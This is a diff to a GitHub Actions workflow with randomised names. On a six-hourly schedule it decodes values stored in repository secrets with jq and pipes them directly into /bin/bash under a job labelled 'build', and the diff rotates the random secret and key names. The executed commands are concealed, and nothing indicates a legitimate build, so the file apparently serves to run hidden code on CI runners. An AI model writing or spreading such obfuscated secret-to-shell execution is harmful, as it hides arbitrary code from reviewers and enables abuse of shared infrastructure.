@@ -2,7 +2,8 @@ name: shenwansi4178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 1/6 * * *'
+    - cron: '29 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,23 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: shenwansi4178
         env:
-          dbipp34: ${{ secrets.dbipp34 }}
+          l5486: ${{ secrets.l5486 }}
         run: |
-          echo $dbipp34 | jq -r .ljrv96 | /bin/bash
-          echo $rjcek099 | jq -r .lyxav314 | /bin/bash
-          echo $kl32323 | jq -r .hbasl7 | /bin/bash
-          echo $rp01 | jq -r .wn6 | /bin/bash
-          echo $vkoh88147 | jq -r .j10083 | /bin/bash
-          echo $sjf00 | jq -r .kysj751 | /bin/bash
-          echo $vbyp76440 | jq -r .oxkc452 | /bin/bash
-          echo $cef8 | jq -r .tso8671 | /bin/bash
-          echo $gtu14727 | jq -r .uka9 | /bin/bash
-          echo $xk1 | jq -r .eplzz9521 | /bin/bash
-          echo $kospf136 | jq -r .un7 | /bin/bash
-          echo $d518 | jq -r .qbkcb114 | /bin/bash
-          echo $w77 | jq -r .m6369 | /bin/bash
-          echo $ai6390 | jq -r .cyxm402 | /bin/bash
-          echo $pco87 | jq -r .jqqd61 | /bin/bash
-          echo $eobei28697 | jq -r .vb648 | /bin/bash
-          echo $rwxjq0118 | jq -r .djpnm7 | /bin/bash
+          echo $l5486 | jq -r .rt4939 | /bin/bash
+          echo $idaa8 | jq -r .d4 | /bin/bash
+          echo $xed17 | jq -r .cfoj60865 | /bin/bash
+          echo $cxauo1 | jq -r .ic0924 | /bin/bash
+          echo $ggap65 | jq -r .lvo0589 | /bin/bash
+          echo $vilm1 | jq -r .xhfvv6 | /bin/bash
 
